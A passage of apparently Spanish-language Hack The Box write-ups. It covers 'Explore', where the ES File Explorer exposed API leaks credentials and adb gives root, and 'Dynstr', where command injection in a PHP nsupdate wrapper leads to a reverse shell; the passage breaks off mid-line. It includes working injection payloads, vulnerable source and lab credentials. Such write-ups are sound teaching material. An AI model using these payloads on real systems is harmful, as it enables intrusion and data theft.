255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (59777), ssh (2222), desconocido (38793).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Nmap 7.91 scan initiated Sat Jul 3 03:26:05 2021 as: nmap -Pn -sV -sC -p2222,38793,59777 -oN scan_ports 10.10.10.247 Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.13s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 38793/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Sat, 03 Jul 2021 04:01:28 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: [ ... REDACTED ... ] 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). # Nmap done at Sat Jul 3 03:27:47 2021 -- 1 IP address (1 host up) scanned in 102.15 seconds Puerto HTTP En el puerto 59777 no encontramos ningun tipo de informacion.\n1 2 3 4 5 6 7 8 π ~/htb/explore ❯ curl -s http://10.10.10.247:59777/ FORBIDDEN: No directory listing. π ~/htb/explore ❯ curl -sI http://10.10.10.247:59777/ HTTP/1.0 403 Forbidden Content-Type: text/plain Date: Sat, 3 Jul 2021 05:07:04 GMT π ~/htb/explore ❯ Feroxbuster Tras ejecutar feroxbuster encontramos multiples directorios y archivos, algunos de estos nos indican que es de un dispositivo Android, entre estos vemos la flag root a la cual no tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 π ~/htb/explore ❯ feroxbuster --url http://10.10.10.247:59777/ -w /usr/share/wordlists/dirb/big.txt -T 10 -x txt,html,json,xml,php,htm,db,key ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.2.1 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.247:59777/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/big.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 10 🦡 User-Agent │ feroxbuster/2.2.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [txt, html, json, xml, php, htm, db, key] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 1l 3w 0c http://10.10.10.247:59777/data 301 1l 3w 0c http://10.10.10.247:59777/etc 301 1l 3w 0c http://10.10.10.247:59777/data/data 301 1l 3w 0c http://10.10.10.247:59777/config 301 1l 3w 0c http://10.10.10.247:59777/d 403 1l 4w 0c http://10.10.10.247:59777/init 301 1l 3w 0c http://10.10.10.247:59777/mnt 301 1l 3w 0c http://10.10.10.247:59777/storage 301 1l 3w 0c http://10.10.10.247:59777/etc/init 200 2l 4w 56c http://10.10.10.247:59777/etc/hosts 301 1l 3w 0c http://10.10.10.247:59777/oem 403 1l 4w 0c http://10.10.10.247:59777/data/root.txt 301 1l 3w 0c http://10.10.10.247:59777/etc/permissions 301 1l 3w 0c http://10.10.10.247:59777/data/property 301 1l 3w 0c http://10.10.10.247:59777/bin 200 621l 1669w 29926c http://10.10.10.247:59777/etc/fonts.xml [... REDACTED ...] 301 1l 3w 0c http://10.10.10.247:59777/data/adb 301 1l 3w 0c http://10.10.10.247:59777/data/backup 301 1l 3w 0c http://10.10.10.247:59777/data/system 301 1l 3w 0c http://10.10.10.247:59777/data/local/traces 301 1l 3w 0c http://10.10.10.247:59777/system/etc 301 1l 3w 0c http://10.10.10.247:59777/data/data/android User Es File Explorer Realizamos una busqueda del puerto en dispositivos android y encontramos un post de Portswigger en el que describe una vulnerabilidad en la aplicacion ES File Explorer la cual expone un servidor HTTP en el puerto 59777 localmente por medio del cual un atacante puede enviar multiples comandos en formato JSON.\nPoC - Es File Explorer El PoC se encuentra en Github - fs0c131y, basicamente realiza distintas solicitudes en formato JSON con diferentes commandos para obtener informacion del dispositivo, listar y descargar archivos, fotos, videos, audios, etc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # curl --header \u0026#34;Content-Type: application/json\u0026#34; --request POST --data \u0026#39;{\u0026#34;command\u0026#34;:\u0026#34;[my_awesome_cmd]\u0026#34;}\u0026#39; http://192.168.0.8:59777 π ESFileExplorerOpenPortVuln master ❯ python poc.py list ###################### # Available Commands # ###################### listFiles: List all the files listPics: List all the pictures listVideos: List all the videos listAudios: List all the audio files listApps: List all the apps installed listAppsSystem: List all the system apps listAppsPhone: List all the phone apps listAppsSdcard: List all the apk files in the sdcard listAppsAll: List all the apps installed (system apps included) getDeviceInfo: Get device info. Package name parameter is needed appPull: Pull an app from the device appLaunch: Launch an app. Package name parameter is needed getAppThumbnail: Get the icon of an app. Package name parameter is needed Credenciales Relizamos una enumeracion con los diferentes comandos, y encontramos imagenes las cuales descargamos.\n1 2 3 4 5 6 7 8 9 π ESFileExplorerOpenPortVuln master ❯ python poc.py --cmd listPics --host 10.10.10.247 [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200 {\u0026#34;name\u0026#34;:\u0026#34;concept.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:08 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/concept.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;135.33 KB (138,573 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:50 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;6.24 KB (6,392 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;creds.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:18 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/creds.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;1.14 MB (1,200,401 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;224_anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:21 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/224_anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;124.88 KB (127,876 Bytes)\u0026#34;} π ESFileExplorerOpenPortVuln master ❯ En una de ellas se muestra un texto que segun el nombre del archivo podrian indicar credenciales.\n1 kristi:kr1st!5h@Rp3xPl0r3! Shell Utilizamos las credenciales en el servicio SSH en el puerto 2222 por donde logramos obtener acceso.\n1 2 3 4 5 6 7 π ~/htb/explore ❯ ssh kristi@10.10.10.247 -p 2222 # Kr1sT!5h@Rp3xPl0r3! Password authentication Password: :/ $ whoami; id; pwd u0_a76 uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768 / Enumerando los directorios encontramos la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 :/sdcard $ ls -lah total 34K drwxrwx--- 15 root everybody 4.0K 2021-04-21 02:12 . drwx--x--x 4 root everybody 4.0K 2021-03-13 17:16 .. drwxrwx--- 5 root everybody 4.0K 2021-03-13 17:30 .estrongs -rw-rw---- 1 root everybody 72 2021-04-21 01:01 .userReturn drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Alarms drwxrwx--- 3 root everybody 4.0K 2021-03-13 17:16 Android drwxrwx--- 2 root everybody 4.0K 2021-04-21 02:38 DCIM drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:37 Download drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Movies drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Music drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Notifications drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Pictures drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Podcasts drwxrwx--- 2 root everybody 4.0K 2021-03-13 17:16 Ringtones drwxrwx--- 3 root everybody 4.0K 2021-03-13 17:30 backups drwxrwx--- 2 root everybody 4.0K 2021-04-21 02:12 dianxinos -rw-rw---- 1 root everybody 33 2021-03-13 18:28 user.txt :/sdcard $ cat user.txt f32017174c7c7e8f50c6da52891ae250 :/sdcard $ Privesc Localmente encontramos el puerto 5555 que comunmente es utilizado por adb.\n1 2 3 4 5 6 7 8 9 :/sdcard $ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program Name tcp6 0 0 :::2222 :::* LISTEN 3427/net.xnano.android.sshserver tcp6 0 0 ::ffff:127.0.0.1:45231 :::* LISTEN - tcp6 0 0 :::5555 :::* LISTEN - tcp6 0 0 ::ffff:10.10.10.2:34293 :::* LISTEN - tcp6 0 0 :::59777 :::* LISTEN - :/sdcard $ ADB Tras escanear el puerto aparece como filtrado y algunas veces como abierto, intentando una conexion con adb se muestra con tiempo de conexion agotado.\n1 2 3 4 5 6 7 8 9 10 11 # nmap 10.10.10.247 -p 5555 Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.071s latency). PORT STATE SERVICE 5555/tcp filtered freeciv # π ~/htb/explore ❯ adb connect 10.10.10.247:5555 * daemon not running; starting now at tcp:5037 * daemon started successfully failed to connect to \u0026#39;10.10.10.247:5555\u0026#39;: Connection timed out Utilizando SSH obtuvimos el puerto 5555 localmente utilizando las credenciales anteriormente encontradas.\n1 2 # give me port 5555 ssh -L 5555:0.0.0.0:5555 kristi@10.10.10.247 -p 2222 # Kr1sT!5h@Rp3xPl0r3! Con adb nos conectamos con una shell con privilegios bajos para probar la conexion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # check or kill server already started # connect to the port 5555 π ~/htb/explore ❯ adb kill-server π ~/htb/explore ❯ adb connect 127.0.0.1:5555 * daemon not running; starting now at tcp:5037 * daemon started successfully connected to 127.0.0.1:5555 # list devices π ~/htb/explore ❯ adb devices List of devices attached 127.0.0.1:5555 device emulator-5554 device # low priv shell π ~/htb/explore ❯ adb -s emulator-5554 shell x86_64:/ $ whoami shell x86_64:/ $ Shell Root Le \u0026ldquo;dimos\u0026rdquo; permisos root con adb al dispositivo y tras conectarnos obtuvimos una shell como root y con ello la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/explore ❯ adb -s emulator-5554 root π ~/htb/explore ❯ adb -s emulator-5554 shell x86_64:/ # whoami root x86_64:/ # cd data x86_64:/data # ls adb backup local nfc ssh_starter.sh vendor anr bootchart lost+found ota system vendor_ce app cache media ota_package system_ce vendor_de app-asec dalvik-cache mediadrm property system_de app-ephemeral data misc resource-cache tombstones app-lib drm misc_ce root.txt user app-private es_starter.sh misc_de ss user_de x86_64:/data # cat root.txt f04fc82b6d49b41c9b08982be59338c5 x86_64:/data # ","description":"Explorer, la primera maquina android en HTB. Encontramos un puerto relacionado a ES File Explorer que expone una API que permite listar y descargar archivos del dispositivo, por donde descubrimos credenciales de acceso en una imagen. Para escalar privilegios utilizamos SSH para conectarnos con ADB a una shell privilegiada.","id":45,"section":"posts","tags":["android","adb","es file explorer","api","ssh"],"title":"Hack The Box - Explore","uri":"https://sckull.github.io/posts/explore/"},{"content":"\rDynstr presenta un \u0026quot;sistema\u0026quot; similar a no-ip donde logramos realizar command injection para obtener acceso. SSH tiene un tipo de autenticacion diferente, accedimos por este servicio agregando registros DNS y utilizando la clave privada de un archivo de log. Escalamos privilegios mediante Wildcards para el comando cp en la ejecucion de un script.\nNombre dynstr OS Linux Puntos 30 Dificultad Media IP 10.10.10.244 Maker jkr\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.3, 5.6, 4.2, 5.8, 4.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[4, 6, 1, 9, 4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), dns (53), ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Nmap 7.91 scan initiated Fri Jun 18 20:24:11 2021 as: nmap -sV -sC -p22,53,80 -oN scan_ports 10.10.10.244 Nmap scan report for 10.10.10.244 (10.10.10.244) Host is up (0.26s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 18 20:24:29 2021 -- 1 IP address (1 host up) scanned in 17.85 seconds Web Site La pagina muestra distintos servicios, en esta seccion encontramos algunos dominios y tambien unas credenciales, tambien observamos el dominio dyna.htb que tomamos como dominio principal.\nAsi mismo encontramos informacion acerca de una API, la misma que no-ip.com.\nWe are providing dynamic DNS for anyone with the same API as no-ip.com has. Maintaining API conformance helps make clients work properly.\nUtilizamos dig para realizar una solicitud utilizando como servidor la ip, en su respuesta vemos dos subdominios dns1 y hostmaster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/dynstr ❯ dig dyna.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.11-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; dyna.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 57168 ;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: be199b3ca41ec6560100000060cd3ea516dc261a342f5893 (good) ;; QUESTION SECTION: ;dyna.htb.\tIN\tA ;; AUTHORITY SECTION: dyna.htb.\t60\tIN\tSOA\tdns1.dyna.htb. hostmaster.dyna.htb. 2021030302 21600 3600 604800 60 ;; Query time: 80 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Fri Jun 18 20:31:23 EDT 2021 ;; MSG SIZE rcvd: 117 π ~/htb/dynstr ❯ Agregamos los distintos dominios y subdmonios al archivo /etc/hosts, al visitar cada uno de estos encontramos la misma pagina.\n1 2 3 4 5 6 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb dns1.dyna.htb hostmaster.dyna.htb Directory Brute Forcing Realizamos una busqueda de directorios y archivos utilizando feroxbuster al dominio dyna.htb, encontramos el directorio nic, vemos index y update.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 π ~/htb/dynstr ❯ feroxbuster -u http://10.10.10.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.2.1 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.244/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.2.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 403 9l 28w 277c http://10.10.10.244/server-status 301 9l 28w 313c http://10.10.10.244/assets 301 9l 28w 310c http://10.10.10.244/nic 301 9l 28w 317c http://10.10.10.244/assets/css 200 1l 1w 8c http://10.10.10.244/nic/update 301 9l 28w 319c http://10.10.10.244/assets/fonts 301 9l 28w 316c http://10.10.10.244/assets/js no-ip Al visitar update solo se muestra un mensaje de badauth, seguramente necesita algun tipo de autenticacion.\nRealizando una busqueda por Google (badauth, /nic/update) encontramos informacion referente a DynDNS, donde se indican el error badauth y los tipos de autenticacion (docs - dyn.com, doc no-ip.com) informacion que esta relacionada a no-ip.com de la descripcion de los servicios.\nLa descripcion de no-ip.com indica como se debe de realizar una solicitud para realizar una actualizacion de DNS dinamico, utilizamos las credenciales para autenticarnos en /update utilizando el header Authorization y codificando en base64 usuario:contraseña, además utilizamos el User-Agent de Software.\n1 2 3 π ~/htb/dynstr ❯ echo -n \u0026#34;dynadns:sndanyd\u0026#34;|base64 ZHluYWRuczpzbmRhbnlk π ~/htb/dynstr ❯ De tal forma que nuestra solicitud quedaría de la siguiente forma, y, utilizando burpsuite enviamos la solicitud.\n1 2 3 4 GET /nic/update?myip=10.10.14.21\u0026amp;hostname=dyna.htb HTTP/1.1 Host: dynupdate.no-ip.htb Authorization: Basic ZHluYWRuczpzbmRhbnlk User-Agent: Company NameOfProgram/OSVersion-ReleaseVersion maintainer-contact@example.com El resultado fue un error 911.\n1 2 3 4 5 HTTP/1.1 200 OK [... REDACTED ...] Content-Type: text/html; charset=UTF-8 911 [wrngdom: htb] Ya que esta utilizando la API de no-ip.com debemos de pasarle un hostname seguido de no-ip.htb en este caso. Vemos un mensaje, lo que significa que el hostname se actualizó a la direccion dada.\n1 2 3 4 5 6 7 8 9 10 11 12 # REQUEST GET /nic/update?myip=10.10.14.21\u0026amp;hostname=test.no-ip.htb HTTP/1.1 Host: dynupdate.no-ip.htb Authorization: Basic ZHluYWRuczpzbmRhbnlk User-Agent: Company NameOfProgram/OSVersion-ReleaseVersion maintainer-contact@example.com # RESPONSE HTTP/1.1 200 OK [... REDACTED ...] Content-Type: text/html; charset=UTF-8 good 10.10.14.21 Utilizando dig encontramos que nuestra direccion IP esta relacionada con test.no-ip.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/dynstr ❯ dig @dyna.htb test.no-ip.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.11-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @dyna.htb test.no-ip.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 36063 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: c0bc6e031af14f120100000060cd85fdb16839b5fbe4a944 (good) ;; QUESTION SECTION: ;test.no-ip.htb.\tIN\tA ;; ANSWER SECTION: test.no-ip.htb.\t30\tIN\tA\t10.10.14.21 ;; Query time: 67 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Sat Jun 19 01:35:47 EDT 2021 ;; MSG SIZE rcvd: 87 π ~/htb/dynstr ❯ User - www-data Jugando con los parametros de la solicitud encontramos algunos errores uno de estos muestra el servidor y la zona, el segundo muestra un error nsupdate failed.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 # REQUEST GET /nic/update?myip=10.10.14.21\u0026amp;hostname=\u0026#34;test.no-ip.htb HTTP/1.1 # RESPONSE HTTP/1.1 200 OK [... REDACTED ...] Content-Type: text/html; charset=UTF-8 server 127.0.0.1 zone no-ip.htb update delete test.no-ip.htb good 10.10.14.21 1 2 3 4 5 6 7 8 9 # REQUEST GET /nic/update?myip=10.10.14.21\u0026amp;hostname=*test.no-ip.htb HTTP/1.1 # RESPONSE HTTP/1.1 200 OK [... REDACTED ...] Content-Type: text/html; charset=UTF-8 911 [nsupdate failed] Command Injection Google muestra que el error nsupdate failed esta relacionado a algunos comandos y encontramos que es un comando para Actualizacion de DNS dinamico, por lo que seguramente se esté utilizando un comando y los parametros de hostname para realizar estas solicitudes, en tal caso podriamos inyectar comandos.\nIntentamos diferentes payloads pero al intentar realizar algun tipo de solicitud hacia nuestra direccion IP, se mostraba un error.\n1 2 3 4 5 6 # GET /nic/update?myip=10.10.14.21\u0026amp;hostname=$(ping+-c+1+10.10.14.21)test.no-ip.htb HTTP/1.1 HTTP/1.1 200 OK [... REDACTED ...] Content-Type: text/html; charset=UTF-8 911 [wrngdom: 10.14.21)test.no-ip.htb] Ping Utilizamos base64 para codificar nuestro comando y en la solicitud decodificarlo y ejecutarlo.\n1 2 3 π ~/htb/dynstr ❯ echo -n \u0026#34;ping -c 3 10.10.14.21\u0026#34;|base64 cGluZyAtYyAzIDEwLjEwLjE0LjIx π ~/htb/dynstr ❯ Enviamos la solicitud y en nuestra consola obtuvimos un ping desde la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # GET /nic/update?myip=10.10.14.21\u0026amp;hostname=$(echo+cGluZyAtYyAzIDEwLjEwLjE0LjIx|base64+-d|bash)test.no-ip.htb HTTP/1.1 π ~/htb/dynstr/tmp/noip-2.1.9-1 ❯ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 01:54:29.421039 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 13, seq 1, length 64 01:54:29.421073 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 13, seq 1, length 64 01:54:30.446172 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 13, seq 2, length 64 01:54:30.446188 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 13, seq 2, length 64 01:54:31.451630 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 13, seq 3, length 64 01:54:31.451665 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 13, seq 3, length 64 01:54:31.681942 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 14, seq 1, length 64 01:54:31.681977 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 14, seq 1, length 64 01:54:32.777181 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 14, seq 2, length 64 01:54:32.777216 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 14, seq 2, length 64 01:54:33.596883 IP dynstr.htb \u0026gt; 10.10.14.21: ICMP echo request, id 14, seq 3, length 64 01:54:33.596922 IP 10.10.14.21 \u0026gt; dynstr.htb: ICMP echo reply, id 14, seq 3, length 64 Shell Codificamos una shell inversa, en la solicitud cambiamos + por %2b, al enviar la solicitud logramos obtener acceso con el usuario www-data.\n1 2 3 4 5 6 7 8 π ~/htb/dynstr ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.21] from dynstr.htb [10.10.10.244] 46752 bash: cannot set terminal process group (754): Inappropriate ioctl for device bash: no job control in this shell www-data@dynstr:/var/www/html/nic$ whoami www-data www-data@dynstr:/var/www/html/nic$ User - Bindmrg Encontramos el codigo fuente de update y vemos que ejecuta system() y, mediante echo pasa los valores enviados en los parametros, para poder asi ejecutar el comando nsupdate.\nbash\rphp\r1 2 3 4 5 echo \u0026#34;server 127.0.0.1 zone no-ip.htb update delete test.no-ip.htb update add test.no-ip.htb 30 IN A no-ip.htb send\u0026#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php // Check authentication if (!isset($_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;]) || !isset($_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;])) { echo \u0026#34;badauth\\n\u0026#34;; exit; } if ($_SERVER[\u0026#39;PHP_AUTH_USER\u0026#39;].\u0026#34;:\u0026#34;.$_SERVER[\u0026#39;PHP_AUTH_PW\u0026#39;]!==\u0026#39;dynadns:sndanyd\u0026#39;) { echo \u0026#34;badauth\\n\u0026#34;; exit; } // Set $myip from GET, defaulting to REMOTE_ADDR $myip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; if ($valid=filter_var($_GET[\u0026#39;myip\u0026#39;],FILTER_VALIDATE_IP)) { $myip = $valid; } if(isset($_GET[\u0026#39;hostname\u0026#39;])) { // Check for a valid domain list($h,$d) = explode(\u0026#34;.\u0026#34;,$_GET[\u0026#39;hostname\u0026#39;],2); $validds = array(\u0026#39;dnsalias.htb\u0026#39;,\u0026#39;dynamicdns.htb\u0026#39;,\u0026#39;no-ip.htb\u0026#39;); if(!in_array($d,$validds)) { echo \u0026#34;911 [wrngdom: $d]\\n\u0026#34;; exit; } // Update DNS entry $cmd = sprintf(\u0026#34;server 127.0.0.1\\nzone %s\\nupdate delete %s.%s\\nupdate add %s.%s 30 IN A %s\\nsend\\n\u0026#34;,$d,$h,$d,$h,$d,$myip); system(\u0026#39;echo \u0026#34;\u0026#39;.$cmd.\u0026#39;\u0026#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key\u0026#39;,$retval); // Return good or 911 if (!$retval) { echo \u0026#34;good $myip\\n\u0026#34;; } else { echo \u0026#34;911 [nsupdate failed]\\n\u0026#34;; exit; } } else { echo \u0026#34;nochg $myip\\n\u0026#34;; } ?\u0026gt; Enumerando los directorios en /home encontramos en el archivo authorized_keys la \u0026ldquo;opcion\u0026rdquo; from, segun la documentacion indica que pueden ser añadidos varias direcciones IP, y de esta forma incrementar la seguridad a la hora de ingresar por medio de SSH.\n1 2 3 4 5 6 7 8 9 10 11 www-data@dynstr:/home/bindmgr/.ssh$ ls -lah total 24K drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13 12:09 . drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15 20:39 .. -rw-r--r-- 1 bindmgr bindmgr 419 Mar 13 12:00 authorized_keys -rw------- 1 bindmgr bindmgr 1.8K Mar 13 11:48 id_rsa -rw-r--r-- 1 bindmgr bindmgr 395 Mar 13 11:48 id_rsa.pub -rw-r--r-- 1 bindmgr bindmgr 444 Mar 13 12:09 known_hosts www-data@dynstr:/home/bindmgr/.ssh$ cat aut* from=\u0026#34;*.infra.dyna.htb\u0026#34; ssh-rsa 